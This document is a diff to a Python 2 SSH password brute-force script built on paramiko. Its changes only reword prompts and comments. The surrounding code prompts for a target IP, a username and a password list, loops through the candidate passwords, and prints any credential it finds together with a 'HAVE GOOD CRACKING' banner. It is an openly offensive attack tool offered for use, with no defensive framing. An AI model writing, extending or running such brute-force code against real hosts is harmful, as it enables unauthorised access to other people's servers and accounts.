@@ -21,7 +21,7 @@ line = "\n----------------------------------------------------------------------
 print (colored("<<< [+] Ssh Bruteforce >>>",'yellow'))
 print(colored("[?] Press Ctrl+c tu quit\n",'grey'))
 try:
-	host= raw_input (colored("[+] Enter Target: " ,'blue'))# just banner
+	host= raw_input (colored("[+] Enter Target IP: " ,'blue'))# just banner
 	username= raw_input(colored("[+] Enter SSH Username: ",'blue'))#just banner
 	input_file= raw_input(colored("[+] Enter Path Password list: ", 'blue'))# just banner
 	print ("[+] HAVE GOOD CRACKING ;)")#just banner
@@ -44,7 +44,7 @@ def ssh_connect(password, code=0): #[+] Connection Established
 	except paramiko.AuthenticationException:
 		code=1  #[!] Authentication Failled
 	except socket.error, e:
-		code=2 #[!] Host down or Connection refused or there is a Firewall behind
+		code=2 #[!] Host down or Connection refused through a Firewall
 
 	ssh.close()
 	return code
@@ -59,7 +59,7 @@ for i in input_file.readlines():
 
 		if response==0: #[+]Connection Established
 			print(colored("%s[+]User: %s [+]Password Found: %s [+]Target: %s%s" %(line ,username, password, host, line),'green'))
-			print(colored("SSH Login - [ssh user@IP]",'grey'))
+			print(colored("SSH Login - [ssh user@IP]",'grey'))#Print values,
 			sys.exit(0)
 		elif response==1: #[!]Authentication Failed
 			print(colored("[?] User: %s [?] Tryng Password: %s  Login Incorrect!" %(username,password),'yellow'))
